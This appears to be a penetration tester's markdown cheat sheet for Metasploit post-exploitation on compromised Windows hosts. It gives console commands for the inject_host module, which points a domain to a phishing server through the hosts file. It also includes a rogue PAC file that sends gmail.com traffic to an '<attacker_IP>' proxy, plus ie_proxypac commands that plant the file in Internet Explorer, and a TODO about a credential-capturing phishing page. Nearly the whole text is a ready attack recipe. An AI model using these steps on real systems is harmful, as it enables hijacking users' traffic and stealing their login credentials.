# Metasploit

## Inject DNS Hosts

```
msf > use post/windows/manage/inject_host

msf post(windows/manage/inject_host) > options

Module options (post/windows/manage/inject_host):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   DOMAIN                    yes       Domain name for host file manipulation.
   IP                        yes       IP address to point domain name to.
   SESSION                   yes       The session to run this module on

msf post(windows/manage/inject_host) > set domain <domain>

msf post(windows/manage/inject_host) > set ip <phishing_server>

msf post(windows/manage/inject_host) > set session <session_ID>

msf post(windows/manage/inject_host) > run
```

## Load Rouge HTTP Proxy

TODO: Show a step by step approach to setup a phishing webpage to capture credentials

```javascript
function FindProxyForURL(url, host) {
	if (shExpMatch(host, "www.gmail.com")) { 
		 return "PROXY <attacker_IP>:80; DIRECT";
	}
	if (shExpMatch(host, "www.shelliscoming.com")) { 
		return "PROXY <attacker_IP>:80; DIRECT";
	}
	if (url.substring(0, 6) == "https:") {
		return "DIRECT";
	}
}
```

```
msf > use post/windows/manage/ie_proxypac

msf post(windows/manage/ie_proxypac) > options

msf post(windows/manage/ie_proxypac) > set local_pac /local/path/to/file.pac

msf post(windows/manage/ie_proxypac) > run session=<session_ID>

msf post(windows/manage/ie_proxypac) > sessions -i <session_ID>

meterpreter > getproxy
```

---
## References

### Shell is Coming

- [Shell is Coming: Controlling Internet Explorer user traffic through a proxy PAC file](https://www.shelliscoming.com/2013/12/metasploit-controlling-internet.html)